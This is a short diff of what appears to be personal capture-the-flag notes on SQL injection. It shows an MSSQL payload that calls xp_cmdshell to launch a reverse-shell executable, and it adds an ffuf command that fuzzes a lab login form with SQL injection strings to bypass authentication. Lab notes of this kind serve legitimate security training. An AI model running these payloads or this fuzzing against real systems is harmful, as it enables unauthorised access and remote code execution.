@@ -143,7 +143,9 @@ SQL payload
  ' ; EXEC xp_cmdshell 'C:\Windows\Temp\windows-reverse.exe'; --
 	
 
+Login bypas
 
+ffuf -w SQL.txt -X POST -u http://cheesectf.thm/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 227 
 
 
 
